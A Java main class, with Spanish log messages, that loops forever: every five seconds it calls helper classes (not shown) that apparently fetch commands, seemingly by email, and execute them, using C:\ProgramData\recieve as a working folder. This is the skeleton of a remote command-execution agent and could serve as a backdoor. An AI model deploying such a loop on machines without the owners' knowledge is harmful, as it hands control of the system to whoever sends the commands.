package main;

import java.io.IOException;

import javax.mail.MessagingException;

import getCommands.CommandManager;
import getCommands.CommandUpdater;

public class Main {
	static int tsleep = 5;

	public static void main(String[] args) throws MessagingException, IOException {
		Paths paths = new Paths("C:\\ProgramData\\recieve");
		if (args.length != 0) {
			paths = new Paths(args[0]);
		}
		
		CommandManager manager = new CommandManager(paths);
		CommandUpdater updater = new CommandUpdater(paths);

		while (true) {
			try {
				System.out.printf("dormido\n");
				Thread.sleep(tsleep * 1000); // 1000 milliseconds is one second.
			} catch (Exception e) {
				Thread.currentThread().interrupt();
			}

			try {
				System.out.printf("despierto\n");
				manager.commandClean();
				updater.updateCommands();
				// manager.printCommand();
				manager.commandRun();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
